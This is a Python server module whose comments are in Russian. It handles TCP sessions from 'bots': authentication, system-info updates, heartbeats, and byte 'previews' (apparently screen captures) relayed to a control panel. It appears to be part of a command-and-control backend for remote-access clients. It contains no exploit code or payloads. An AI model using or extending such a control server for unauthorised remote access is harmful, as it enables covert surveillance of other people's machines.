# backend/Core/ClientConnection.py

import asyncio
import socket
from datetime import datetime
from typing import Optional, Dict, Any, Tuple

import backend.LoggerWrapper as logger
from backend.Services.network import NetworkProtocol
from backend.Services.Auth import authorize_bot, sync_bot_data
from backend.Services.ClientManager import active_clients, preview_cache
from backend.Services.SystemState import system_state
from backend.API.connection_manager import manager
from backend import add_bytes
from backend.Database import db_get_bots, db_update_bot

class BotConnectionHandler:
    """
    Обработчик входящих TCP-соединений от ботов версии 8.0.
    Обеспечивает жизненный цикл сессии, маршрутизацию пакетов и синхронизацию состояний.
    Схема пакета: [HEADER: 8 bytes] + [ID: variable] + [METADATA: string] + [PAYLOAD: bytes/json].
    """

    async def handle_new_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        """Управляет процессом авторизации и основным циклом прослушивания сокета."""
        bot_identifier: Optional[str] = None
        peer_address_info: Tuple[str, int] = writer.get_extra_info("peername")
        peer_host: str = peer_address_info[0]

        if (client_socket := writer.get_extra_info("socket")):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            auth_result: Optional[Tuple[str, Dict[str, Any]]] = await authorize_bot(reader, peer_host)
            if not auth_result:
                return await self._force_close_stream(writer)

            bot_identifier, _ = auth_result
            active_clients[bot_identifier] = (reader, writer)

            # Точечное уведомление о подключении вместо полной перерисовки
            manager.broadcast_packet_sync(system_state.get_single_bot_packet(bot_identifier))

            if (preview_packet := system_state.get_preview_packet(bot_identifier)):
                manager.broadcast_packet_sync(preview_packet)

            logger.Log.success(f"[{self.__class__.__name__}] Bot session started: {bot_identifier}")

            while True:
                try:
                    raw_buffer, current_id, metadata, payload = await asyncio.wait_for(
                        NetworkProtocol.read_packet_full(reader),
                        timeout=65.0
                    )
                except (asyncio.TimeoutError, ConnectionResetError, BrokenPipeError, asyncio.IncompleteReadError):
                    break

                if not raw_buffer or not current_id:
                    break
                
                add_bytes(len(raw_buffer))
                target_module: str = metadata["module"]
                current_timestamp: str = datetime.now().strftime("%H:%M:%S")

                if target_module == "SystemInfo":
                    payload["last_active"] = current_timestamp
                    payload["status"] = "online"
                    sync_bot_data(current_id, payload)
                    # Шлем только данные этого бота
                    manager.broadcast_packet_sync(system_state.get_single_bot_packet(current_id))

                elif target_module == "Preview":
                    if isinstance(payload, bytes) and payload:
                        preview_cache[current_id] = payload
                        bot_data: Dict[str, Any] = db_get_bots().get(current_id, {"id": current_id})
                        bot_data["last_active"] = current_timestamp
                        db_update_bot(current_id, bot_data)
                        
                        # Проброс байтов превью (уже содержит ID бота)
                        manager.broadcast_packet_sync(raw_buffer)

                elif target_module == "Heartbeat":
                    if metadata["action"] == "PING":
                        bot_data: Dict[str, Any] = db_get_bots().get(current_id, {"id": current_id})
                        bot_data["last_active"] = current_timestamp
                        db_update_bot(current_id, bot_data)
                        
                        response_packet: bytes = NetworkProtocol.pack_packet(current_id, "Heartbeat", "str", "PONG", "none", "")
                        writer.write(response_packet)
                        await writer.drain()

                else:
                    manager.broadcast_packet_sync(raw_buffer)

        except Exception as exception_instance:
            logger.Log.error(f"[{self.__class__.__name__}] Handler error for {bot_identifier}: {exception_instance}")
        finally:
            await self._terminate_bot_session(bot_identifier, writer)

    async def _terminate_bot_session(self, bot_identifier: Optional[str], writer: asyncio.StreamWriter) -> None:
        """Завершает сессию и уведомляет фронтенд об офлайне конкретного ID."""
        if bot_identifier:
            from backend.Services.ClientManager import close_client_session
            await close_client_session(bot_identifier, send_termination_command=False)
            
            # Вместо get_global шлем точечный пакет, где статус уже offline
            manager.broadcast_packet_sync(system_state.get_single_bot_packet(bot_identifier))
            logger.Log.info(f"[{self.__class__.__name__}] Bot {bot_identifier} disconnected and cleaned up")

        await self._force_close_stream(writer)

    async def _force_close_stream(self, writer: asyncio.StreamWriter) -> None:
        """Принудительно закрывает поток передачи данных."""
        try:
            if not writer.transport.is_closing():
                writer.close()
                await writer.wait_closed()
        except Exception:
            pass